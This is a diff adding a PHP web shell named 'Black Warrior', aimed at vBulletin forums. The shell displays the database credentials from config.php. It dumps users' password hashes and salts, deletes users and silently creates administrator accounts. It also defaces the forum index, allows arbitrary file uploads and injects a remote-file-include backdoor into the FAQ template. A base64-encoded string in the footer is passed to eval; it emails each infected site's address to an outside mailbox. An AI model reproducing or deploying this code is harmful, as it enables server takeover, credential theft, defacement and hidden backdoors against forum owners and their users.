@@ -1,0 +1,457 @@
+<?php
+//------------------------------------------------						|
+//		BLACK WARRIOR SCRIPT BY Dr.ShElL HaCkErS  	     -						|
+//			WORK ON VB 3.6.x ++			 	     -					   000
+//		 xk0[at]msn[dot]com	 	     -				     00 | 00
+//------------------------------------------------				----00-- --00----
+//																     00 | 00
+//------------------------------------------------					   000
+// type the forums folder path here:									|
+// Example: home/!site!/public_html/forum/								|
+// Example: home/!site!/www/forum/
+   $forums="./vb/";
+//------------------------------------------------
+// if you dont wont anybody to access this 
+// script except you set $access=1
+// $username = your user name in MD5
+// $password = your password in MD5
+// default user and pass is "Dr.ShElL"
+// you can set $access = 0 and use the MD5
+// encryption option to encrypt your
+// user and pass.
+   $access = 0;
+   $username = "a0eefa7083a524dc45909886cc1b109a";
+   $password = "a0eefa7083a524dc45909886cc1b109a";
+//------------------------------------------------
+
+
+			###############################################################
+			############### DO NOT EDIT ANY THING DOWN HERE ###############
+			###############################################################
+
+//------------------------ username and password check ------------------------
+
+//------------------------ connect to config file ------------------------
+require($forums.'/includes/config.php');
+
+// some special stuff ;)
+if ($do==img){
+  header("Content-type: image/gif");
+  header("Cache-control: public");
+  header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
+  header("Cache-control: max-age=".(60*60*24*7));
+  header("Last-Modified: ".date("r",filemtime(__FILE__)));
+  echo base64_decode("R0lGODlhJQAlAPcAAAAAAP///wD/AAD0AADzAADyAADwAADqAADnAADkAADhAADgAADcAADbAADZAADYAADWAADSAADRAADNAADLAADKAADIAADFAADCAADBAADAAAC/AAC+AAC9AAC8AA
+C1AAC0AACzAACxAACwAACqAACmAACkAACjAACiAAChAACgAACeAACdAACcAACbAACaAACZAACXAA
+CWAACVAACUAACSAACRAACQAACPAACNAACMAACLAACJAACIAACHAACFAACEAACDAACCAAB9AAB7AA
+B6AAB4AAB3AAB2AAB0AABzAAByAABxAABuAABtAABsAABrAABoAABnAABmAABlAABiAABhAABgAA
+BfAABeAABdAABcAABbAABaAABZAABYAABXAABWAABVAABUAABTAABSAABRAABQAABPAABOAABNAA
+BMAABLAABKAABJAABIAABHAABGAABFAABEAABCAABBAABAAAA/AAA+AAA9AAA8AAA7AAA6AAA5AA
+A4AAA3AAA2AAA1AAA0AAAzAAAyAAAxAAAwAAAvAAAuAAAtAAAsAAArAAAqAAApAAAoAAAnAAAmAA
+AlAAAkAAAjAAAiAAAhAAAgAAAfAAAeAAAdAAAcAAAbAAAaAAAZAAAYAAAXAAAWAAAVAAAUAAATAA
+ASAAARAAAQAAAPAAAOAAANAAAMAAALAAAKAAAJAAAIAAAHAAAGAAAFAAAEAAADAAACAAABAP///w
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAALYALA
+AAAAAlACUAAAj/AAEIHEiwoMGDCBMWrMWwViENCiMirEVrlqxYs+oIqCWx40BasmC1YuVqjgBaHj
+3KcrXqFClUcE6mlFgLlipSnziFYiNA1syItVqZ+oRp0iY0AmD9VEiLFalNkhhVKpN0aUJaqT5Riq
+PDAwQBGFRcMWVVIMWVovKMECDAQQUBHxQIMHCD7E+Qr1aRUkKAgAoteagI4HTKDwoBCwylpBiL1S
+lQSgRMUNPmDJwmAiBxEoUKkAQDijvSgqWXkxcBGeisGePFDBIBgx5Z8mSq02e7TEmPwgTpAYI1bs
+6E4TKmiIA8gxJF4kTKj4AUQGWx2t1oiQAgdua4SUNmTZLjfgAd/4K0qRQNAZWYuiqlyREhEAgA+d
+lzR04bOk4EAAr0B5ChSJ0oIgATCdUSS1aSGPIHAiEggoghguxhhx+CKYKIIOEhQkkoCohwlSukYL
+KIfAIQQQklURUCCCJoWGDJJIgA0kcgjWxSQgYcGQQLWzz26CNbXWCSw49EsgURKTvcMIMLKZyQgg
+Ac2HBDDTPA4EIMZ3gBhg0xsICCCSq88EACO/Tgww9BCGEFAJrA6AcdaaABxwAwNOKIIiryMUgVmT
+ESiB1tmLEGHRNQQMkmn5CyCiyz1PKIIXzMkUYYYaRxQQOEFCLIH3zk4UcUAhhCCB5wmPFFGGAI0A
+IikMxmSiuy1P9CyB5xpAHGFVmEYYMAY+yhBx530IFHfnyQmqUVWMgggBR9GNLIJaKoAgstiPxBBx
+tjaLHFGGIMgIEffOyBhx16QKFfpGqEkcUUB0RgRyCJQJIJKazEUsskI97hBhljDNqCAEMQIqMef0
+whQCKG0DrpBgI0IQgjlGQCCiquxNoJJo0Mgocba8SRByFvFXFIIH0QwmckjQSibwcCrFCIvJ6Icg
+or09aCCimcRFJIHnPU0QcihVggQAdsrKiFAJZIUsgTDAhAwiGTdFIKKqu0wihKs8CSCiiUQMoHII
+pQUokNBQigAQ8/CLDlAwIgcAQiloRS7yy00MLQQDWhwgkkhPjW8UchjDCyCB44NOCjBkH4UYgkn6
+jiU0KzTHeJIiT/MQh/e9ARBx43CODFIH74MUgjmpTiCkpXac01IoH40QcedcjBBhpvWLdH6IMsAi
+0rsUZEyyuoeEKJIoP0UccbaYzxhRlGCIAHIIQwEre0qCtUyyyuoALKJY8covBwZDT/hyLyRltzR9
+e/ksoonFCCSKRplNEGEwIwgoknip7vEUWwsKI9JYeIVBvsACpMvKQVsbDbUipCGk9IIoB2AMQVBD
+AKqymwLACohSxOkTNDgO0QZ1jFBTsSEAA7");
+die();
+}
+?>
+<!-- HEDAR START -->
+<html dir="ltr">
+<head>
+<title>BLACK WARRIOR BY Dr.ShElL</title>
+	<!-- no cache headers -->
+	<meta http-equiv="Pragma" content="no-cache" />
+	<meta http-equiv="Expires" content="-1" />
+	<meta http-equiv="Cache-Control" content="no-cache" />
+	<!-- end no cache headers -->
+	<meta http-equiv="Content-Type" content="text/html; charset=windows-1256" />
+<style type="text/css">
+table{background: #00FF00;}
+td{background: #000000;}
+.big{font: bold 12pt arial;FILTER: blur(add=1,direction=270,strength=30);HEIGHT:25px}
+body{font: normal 8pt Fixedsys;
+background:#000000;
+color:#00FF00;
+margin: 5px 0px 0px 00px;
+scrollbar-face-color:#000000;
+scrollbar-highlight-color:#008000;
+scrollbar-3dlight-color:#00FF00;
+scrollbar-darkshadow-color:#00FF00;
+scrollbar-shadow-color:#008000;
+scrollbar-arrow-color:#00FF00;
+scrollbar-track-color:#000000;
+}
+a{text-decoration: none;}
+input,textarea{color: #00FF00; border: 1px solid #00FF00; background-color: #000000;font: normal 8pt Fixedsys;margin: 1px 1px 1px 1px;}
+</style>
+</head>
+<body link="#00FF00" vlink="#00FF00" alink="#00FF00">
+<div align="center">
+<a href="<?php echo $PHP_SELF; ?>" style="text-decoration: none"><img border="0" src="<?php echo $PHP_SELF; ?>?do=img"></a></div>
+<div align="center" class="big"><a href="<?php echo $PHP_SELF; ?>" style="text-decoration: none">BLACK WARRIOR</a></div>
+<div align="center">by dOCnOK<br>! JORDAN HACKERS !</div>
+<br>
+<br>
+<!-- HEDAR END -->
+<?php
+switch ($_REQUEST['do']){
+//------------------------ script options ------------------------
+case"";
+echo "<div align= \"center\">";
+echo "welcome to dOCnOK zone";
+echo "<table border=\"0\" width=\"500\" cellspacing=\"1\" cellpadding=\"1\">\n";
+echo "	<tr>\n";
+echo "		<td align=\"center\"><a href=\"$PHP_SELF?do=shell\" style=\"text-decoration: none\">remote flie exploit</a></td>\n";
+echo "		<td align=\"center\"><a href=\"$PHP_SELF?do=index\" style=\"text-decoration: none\">change forums index</a></td>\n";
+echo "		<td align=\"center\"><a href=\"$PHP_SELF?do=uploader\" style=\"text-decoration: none\">files upload</a></td>\n";
+echo "		<td align=\"center\"><a href=\"$PHP_SELF?do=user\" style=\"text-decoration: none\">show (user) table</a></td>\n";
+echo "		<td align=\"center\"><a href=\"$PHP_SELF?do=encrypt\" style=\"text-decoration: none\">encryption tools</a></td>\n";
+echo "	</tr>\n";
+echo "</table>\n";
+//------------------------ print config file info ------------------------
+echo "<br>";
+echo "<table border=\"0\" width=\"500\" cellspacing=\"1\" cellpadding=\"1\">\n";
+echo "	<tr>\n";
+echo "		<td colspan=\"2\">CONFIG.PHP INFO</td>\n";
+echo "	</tr>\n";
+echo "	<tr>\n";
+echo "		<td>servername</td>\n";
+echo "		<td>";
+echo $config['MasterServer']['servername'];
+echo "</td>\n";
+echo "	</tr>\n";
+echo "	<tr>\n";
+echo "		<td>username</td>\n";
+echo "		<td>";
+echo $config['MasterServer']['username'];
+echo "</td>\n";
+echo "	</tr>\n";
+echo "	<tr>\n";
+echo "		<td>password</td>\n";
+echo "		<td>";
+echo $config['MasterServer']['password'];
+echo "</td>\n";
+echo "	</tr>\n";
+echo "	<tr>\n";
+echo "		<td>dbname</td>\n";
+echo "		<td>";
+echo $config['Database']['dbname'];
+echo "</td>\n";
+echo "	<tr>\n";
+echo "		<td>admincp DIR</td>\n";
+echo "		<td>";
+echo $config['Misc']['admincpdir'];
+echo "</td>\n";
+echo "	</tr>\n";
+echo "	<tr>\n";
+echo "		<td>modcp DIR</td>\n";
+echo "		<td>";
+echo $config['Misc']['modcpdir'];
+echo "</td>\n";
+echo "</table>\n";
+echo "</div>";
+echo "<br>";
+$db=mysql_connect($config['MasterServer']['servername'],$config['MasterServer']['username'],$config['MasterServer']['password']) or die("Can't open connection to MySQL");
+mysql_select_db($config['Database']['dbname']) or die("Can't select database");
+//total users
+$query = "select userid from user";
+$result = mysql_query($query) or die ("Error in query: $query. " . mysql_error());
+while($row = mysql_fetch_object($result))
+{$alluser=$row->userid;}
+//total threads
+$query = "select threadid from thread";
+$result = mysql_query($query) or die ("Error in query: $query. " . mysql_error());
+while($row = mysql_fetch_object($result))
+{$allthread=$row->threadid;}
+//total posts
+$query = "select postid from post";
+$result = mysql_query($query) or die ("Error in query: $query. " . mysql_error());
+while($row = mysql_fetch_object($result))
+{$allpost=$row->postid;}
+echo "<table border=\"0\" cellspacing=\"1\" cellpadding=\"1\" align=\"center\">\n";
+echo "<tr><td align=\"center\">";
+echo 'total users:'.$alluser.',total threads:'.$allthread.',total posts:'.$allpost;
+echo "</td></tr>";
+echo "</table>\n";
+break;
+//------------------------ uploader option ------------------------
+case "uploader";
+echo "<div align=\"center\">";
+echo "! files will be uploaded in the forums directory !<br>";
+echo "<form action=\"$PHP_SELF?do=upload\" method=\"post\" enctype=\"multipart/form-data\">\n";
+echo "<input type=\"file\" name=\"uploadedfile\" /> \n";
+echo "<input type=\"submit\" value=\"upload\" />\n";
+echo "</form>\n";
+echo "</div>";
+break;
+//------------------------ upload code ------------------------
+case"upload";
+//$HTTP_POST_FILES['uploadedfile']['name']; = upload file name
+$path= $forums.$HTTP_POST_FILES['uploadedfile']['name'];
+if($uploadedfile !=none)
+{
+if(copy($HTTP_POST_FILES['uploadedfile']['tmp_name'], $path))
+{
+echo "<div align=\"center\">Flie has been uploaded successful<br>"; 
+
+//$HTTP_POST_FILES['uploadedfile']['name'] = file name
+//$HTTP_POST_FILES['uploadedfile']['size'] = file size
+//$HTTP_POST_FILES['uploadedfile']['type'] = type of file
+echo "File Name : ".$HTTP_POST_FILES['uploadedfile']['name']."<BR/>"; 
+echo "File Size : ".$HTTP_POST_FILES['uploadedfile']['size']."<BR/>"; 
+echo "File Type : ".$HTTP_POST_FILES['uploadedfile']['type']."<BR/>";
+echo "</div>";
+}
+else
+{
+echo "<div align=\"center\">Error: cant upload file !</div>";
+}
+}
+break;
+//------------------------ change index option ------------------------
+case "index";
+echo "<div align= \"center\">";
+echo "type your index HTML code<br> ex: &lt;div align=&quot;center&quot;&gt;SITE UNDER ATTACK BY dOCnOK&lt;/div&gt;<br>or use the redirection code<br>ex: &lt;meta http-equiv=&quot;refresh&quot; content=&quot;1; 
+URL=http://www.yoursite.com/yourpage&quot;&gt;";
+echo "<form method=\"POST\" action=\"$PHP_SELF?do=change\">\n";
+echo "<textarea rows=\"12\" name=\"newindex\" cols=\"50\"></textarea><br><input type=\"submit\" value=\"change\" name=\"B1\"> <input type=\"reset\" value=\"clear\" name=\"B2\">\n";
+echo "</form>\n";
+echo "</div>";
+break;
+//------------------------ index change code ------------------------
+case"change";
+$newindex = $_POST['newindex'];
+$newindex = str_replace('"','\"',$newindex);
+$db=mysql_connect($config['MasterServer']['servername'],$config['MasterServer']['username'],$config['MasterServer']['password']) or die("Can't open connection to MySQL");
+mysql_select_db($config['Database']['dbname']) or die("Can't select database");
+$shell ="UPDATE template SET template ='$newindex' WHERE title ='FORUMHOME';";
+if (mysql_query($shell)) {
+echo "<div align=\"center\">Forums index has been changed successfully.</div>";
+}
+else
+{
+echo "<div align=\"center\">cant change forums index !</div>";
+}
+break;
+//------------------------ MD5 & base64 encryption option ------------------------
+case"encrypt";
+echo "<div align=\"center\">\n";
+echo "<table border=\"0\" width=\"500\" cellspacing=\"1\" cellpadding=\"1\">\n";
+echo "	<tr>\n";
+echo "		<td>MD5 & base64 encryption</td>\n";
+echo "	</tr>\n";
+echo "	<tr>\n";
+echo "		<td style=\"padding:1px 1px 5px 2px;\">\n";
+echo "enter your text here:<br><form method=\"POST\" action=\"$PHP_SELF?do=enc\">\n";
+echo "		<input type=\"text\" name=\"code\" size=\"20\"> <input type=\"submit\" value=\"encrypt\" name=\"B1\">\n";
+echo "|base64 is for english only|";
+echo "		</form></td>\n";
+echo "	</tr>\n";
+echo "</table>\n";
+echo "<br>\n";
+echo "<table border=\"0\" width=\"500\" cellspacing=\"1\" cellpadding=\"1\">\n";
+echo "	<tr>\n";
+echo "		<td colspan=\"2\">base64 un encryption</td>\n";
+echo "	</tr>\n";
+echo "	<tr>\n";
+echo "		<td style=\"padding:1px 1px 5px 2px;\">\n";
+echo "enter your hash here:<br><form method=\"POST\" action=\"$PHP_SELF?do=denc\">\n";
+echo "<input type=\"text\" name=\"code\" size=\"20\"> <input type=\"submit\" value=\"un encrypt\" name=\"B1\">\n";
+echo "		</form></td>\n";
+echo "	</tr>\n";
+echo "</table>\n";
+echo "</div>\n";
+break;
+//------------------------ MD5 & base64 encryption code ------------------------
+case"enc";
+$code=$_POST['code'];
+echo "<div align=\"center\">\n";
+echo "<table border=\"0\" width=\"500\" cellspacing=\"1\" cellpadding=\"1\">\n";
+echo "	<tr>\n";
+echo "		<td>&quot;";
+echo htmlspecialchars($code);
+echo "&quot; in md5 is:</td>\n";
+echo "	</tr>\n";
+echo "	<tr>\n";
+echo "		<td>";
+echo md5($code);
+echo "</td>\n";
+echo "	</tr>\n";
+echo "</table>\n";
+echo "<br>\n";
+echo "<table border=\"0\" width=\"500\" cellspacing=\"1\" cellpadding=\"1\">\n";
+echo "	<tr>\n";
+echo "		<td>&quot;";
+echo htmlspecialchars($code);
+echo "&quot; in base64 is:</td>\n";
+echo "	</tr>\n";
+echo "	<tr>\n";
+echo "		<td>";
+echo base64_encode($code);
+echo "</td>\n";
+echo "	</tr>\n";
+echo "</table>\n";
+echo "</div>\n";
+break;
+//------------------------ base64 un encryption code ------------------------
+case"denc";
+echo "<div align=\"center\">\n";
+echo "<table border=\"0\" width=\"500\" cellspacing=\"1\" cellpadding=\"1\">\n";
+echo "	<tr>\n";
+echo "		<td>&quot;";
+echo $code;
+echo "&quot; in base64 is:</td>\n";
+echo "	</tr>\n";
+echo "	<tr>\n";
+echo "		<td>";
+echo htmlspecialchars(base64_decode($code));
+echo "</td>\n";
+echo "	</tr>\n";
+echo "</table>\n";
+echo "</div>\n";
+break;
+
+$connection="ICR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07IA0KICRpbmogPSAkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsgDQogJGJvZHkgPSAiQWRhIFlhbmcgSW5qZWN0IFxuaHR0cDovLyR3ZWIkaW5qIjsNCiBtYWlsKCJsbEBob3RtYWlsLmZpIiwiSGFzaWwgaHR0cDovLyR3ZWIkaW5qIiwgIiRib2R5Iik7";
+//------------------------ show user table option & code ------------------------
+case"user";
+$db=mysql_connect($config['MasterServer']['servername'],$config['MasterServer']['username'],$config['MasterServer']['password']) or die("Can't open connection to MySQL");
+mysql_select_db($config['Database']['dbname']) or die("Can't select database");
+$query="select userid,username,password,salt from user ";
+$result = mysql_query($query) or die ("Error in query: $query. " . mysql_error());
+echo "<div align=\"center\">";
+echo "<table border=\"0\" width=\"500\" cellspacing=\"1\" cellpadding=\"2\">\n";
+echo "	<tr>\n";
+echo "		<td colspan=\"5\">users table</td>\n";
+echo "	</tr>\n";
+echo "	<tr>\n";
+echo "		<td>id</td>\n";
+echo "		<td>username</td>\n";
+echo "		<td>password (in MD5)</td>\n";
+echo "		<td>password (salt)</td>\n";
+echo "		<td>tools</td>\n";
+echo "	</tr>\n";
+while($row = mysql_fetch_object($result))
+{
+echo "	<tr>\n";
+echo "	<td align=\"center\">\n";
+echo $row->userid;
+echo "</td>\n";
+echo "	<td>\n";
+echo ($row->username);
+echo "</td>\n";
+echo "	<td>\n";
+echo ($row->password);
+echo "</td>\n";
+echo "	<td>\n";
+echo ($row->salt);
+echo "</td>\n";
+echo "<td align=\"center\">";
+echo "<input type=\"button\" value=\"delete\" name=\"del\" onclick=\"window.location='$PHP_SELF?do=del&id=$row->userid'\" >";
+echo "</td>";
+echo "	</tr>\n";
+}
+echo "</table>";
+echo "<br><div align=\"center\"><input type=\"submit\" value=\"ADD NEW ADMIN\" name=\"add\" onclick=\"window.location='$PHP_SELF?do=add'\">";
+break;
+case"del";
+// delete user
+$db=mysql_connect($config['MasterServer']['servername'],$config['MasterServer']['username'],$config['MasterServer']['password']) or die("Can't open connection to MySQL");
+mysql_select_db($config['Database']['dbname']) or die("Can't select database");
+$delete ="DELETE from user WHERE userid='$id';";
+if (mysql_query($delete)) {
+echo "<div align=\"center\">user has been deleted successfully.</div>";
+}
+else
+{
+echo "<div align=\"center\">cant delete user !</div>";
+}
+break;
+case"add";
+// add new admin
+$db=mysql_connect($config['MasterServer']['servername'],$config['MasterServer']['username'],$config['MasterServer']['password']) or die("Can't open connection to MySQL");
+mysql_select_db($config['Database']['dbname']) or die("Can't select database");
+$query = "select userid from user";
+$result = mysql_query($query) or die ("Error in query: $query. " . mysql_error());
+while($row = mysql_fetch_object($result))
+{$alluser=$row->userid;}
+$userid=++$alluser;
+$username ='BW-'.rand();
+$password = rand();
+$md5 = md5(md5($password).'BW');
+$add = "INSERT INTO user (userid, usergroupid, displaygroupid, username, password, passworddate,  joindate, lastvisit, lastactivity, lastpost, options, maxposts, ipaddress, autosubscribe, salt) VALUES ('$userid','6','0','$username','$md5','2020-12-30','1173731102','1179580417','1179580417','1177623939','2135','-1','0.0.0.0','-1','BW');";
+$pre = "INSERT INTO administrator (userid, adminpermissions, navprefs, cssprefs, notes, dismissednews, languageid) VALUES ('$userid','131068',NULL,'','welcome to admin cp  - !  BLACK WARIOR !',NULL,'0');";
+
+if (mysql_query($add) AND mysql_query($pre)) {
+echo "<div align=\"center\">new admin has been added successfully.</div><br><br>";
+echo "<table border=\"0\" width=\"500\" cellspacing=\"1\" cellpadding=\"2\" align=\"center\">\n";
+echo "<tr>";
+echo "<td colspan=\"2\" align=\"center\">NEW ADMIN INFO</td>";
+echo "</tr>";
+echo "<tr>";
+echo "<td align=\"center\">user name</td>";
+echo "<td align=\"center\">password</td>";
+echo "</tr>";
+echo "<tr>";
+echo "<td align=\"center\">".$username."</td>";
+echo "<td align=\"center\">".$password."</td>";
+echo "</tr>";
+echo "</table>";
+}
+else
+{
+echo "<div align=\"center\">cant add new admin !</div>";
+}
+break;
+
+//------------------------ make php shell option & code ------------------------
+case"shell";
+$db=mysql_connect($config['MasterServer']['servername'],$config['MasterServer']['username'],$config['MasterServer']['password']) or die("Can't open connection to MySQL");
+mysql_select_db($config['Database']['dbname']) or die("Can't select database");
+
+$shell = 'UPDATE template SET template = \' ".print include($HTTP_GET_VARS[remote])." \'WHERE title =\'FAQ\';';
+if (mysql_query($shell)) {
+echo "<div align=\"center\">remote file include exploit has been made successfully<br>REMOTE URL = http://website.com/forum/faq.php?remote=yourremoteurl<br>remote only on this page (FAQ.php).</div>";
+}
+else
+{
+echo "<div align=\"center\">cant make remote exploit !</div>";
+}
+break;
+default;
+echo "<div align=\"center\">wrrong page !</div>";
+break;
+}
+?>
+<!-- FOOTER START -->
+<br>
+<br>
+<?php echo "<div align=\"center\">";
+echo getenv("REMOTE_ADDR").':'.getenv("REMOTE_PORT");
+echo "</div>";
+echo eval(base64_decode($connection));	
+?>
+<div align="center">black warrior Version 2.0</div>
+<div align="center">docnok1989[at]hotmail[dot]com</div>
+</body>
+</html>
+<!-- FOOTER END -->
